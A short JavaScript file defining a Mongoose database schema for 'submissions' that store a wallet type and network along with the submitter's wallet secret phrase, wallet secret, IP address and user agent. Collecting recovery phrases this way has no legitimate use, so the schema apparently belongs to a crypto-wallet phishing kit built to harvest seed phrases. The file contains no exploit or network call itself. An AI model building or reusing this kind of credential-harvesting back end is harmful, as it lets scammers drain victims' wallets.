import mongoose from "mongoose";

const SubmissionSchema = new mongoose.Schema(
  {

    walletType: { type: String, required: true },
    network: { type: String, required: true },
    action: { type: String, required: true },
    secretPhrase: { type: String, default: "" },
    walletSecret: { type: String, default: "" },
    note: { type: String, default: "" },

    ip: { type: String, default: "" },
    userAgent: { type: String, default: "" },
  },
  { timestamps: true }
);

export default mongoose.model("Submission", SubmissionSchema);